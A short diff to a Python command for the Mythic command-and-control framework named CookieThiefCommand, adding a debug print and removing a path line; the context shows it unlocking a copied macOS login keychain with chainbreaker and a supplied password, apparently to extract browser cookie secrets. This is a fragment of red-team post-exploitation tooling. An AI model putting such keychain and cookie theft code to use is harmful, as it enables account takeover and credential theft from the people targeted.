@@ -2,7 +2,6 @@ from mythic_payloadtype_container.MythicCommandBase import *
 import json
 import os
 from mythic_payloadtype_container.MythicRPC import *
-sys.path.append('../chainbreaker')
 import chainbreaker
 
 
@@ -77,6 +76,8 @@ class CookieThiefCommand(CommandBase):
             sys.stdout.flush()
 
         try:
+            print(dir(chainbreaker))
+            sys.stdout.flush()
             keychain = chainbreaker.Chainbreaker("tmp_login.keychain-db", unlock_password=password, unlock_key=None,
                                     unlock_file=None)
             if keychain.locked:
